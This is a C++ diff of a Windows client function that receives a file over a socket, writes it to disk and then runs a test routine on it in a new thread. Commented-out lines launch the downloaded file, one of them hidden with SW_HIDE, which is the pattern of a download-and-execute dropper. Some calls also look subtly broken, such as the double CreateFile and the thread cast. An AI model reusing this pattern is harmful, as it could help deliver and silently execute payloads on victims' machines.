@@ -78,7 +78,7 @@ std::string bitToStr(std::string str)
 	return rstr;
 }
 
-bool Client::GetFile()
+void Client::GetFile()
 {
 	HANDLE fFile;
 	DWORD writenbytes;
@@ -96,7 +96,7 @@ bool Client::GetFile()
 	fFile = CreateFile(wfullpath.c_str(), NULL, NULL, NULL, CREATE_NEW, NULL, NULL);
 	fFile = CreateFileW(wfullpath.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
 	if (!GetInt(bufferlength))
-		return false;
+		return;
 	do {
 		GetInt(buffsize);
 		if (buffsize == 0)
@@ -105,16 +105,24 @@ bool Client::GetFile()
 		memset(buff, 0, buffsize + 1);
 		retval = recv(Connection, buff, buffsize, 0);
 		WriteFile(fFile, buff, buffsize, &writenbytes, NULL);
-		if (retval == 0) break;
-		else if (retval == SOCKET_ERROR) break;
+		if (retval == 0)
+		{
+			CancelIo(fFile);
+			break;
+		}
+		else if (retval == SOCKET_ERROR)
+		{
+			CancelIo(fFile);
+			break;
+		}
 	} while (retval > 0);
+	CancelIo(fFile);
 	CloseHandle(fFile);
 	std::cout << "Complite!" << std::endl;
-//	Sleep(2000);
 	//system("C:\\Users\\Kali\\Desktop\\test.exe");
-//	ShellExecute(NULL, NULL, fullpath.c_str(), NULL, NULL, SW_HIDE);
-	std::string sFullPath = ws2s(wfullpath);
-	testFile(sFullPath);
-	return true;
+	//ShellExecute(NULL, NULL, fullpath.c_str(), NULL, NULL, SW_HIDE);
+	std::string str = ws2s(wfullpath);
+	HANDLE threadhandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)testFile, &str, NULL, NULL);
+	WaitForSingleObject(threadhandle, INFINITE);
 }
 
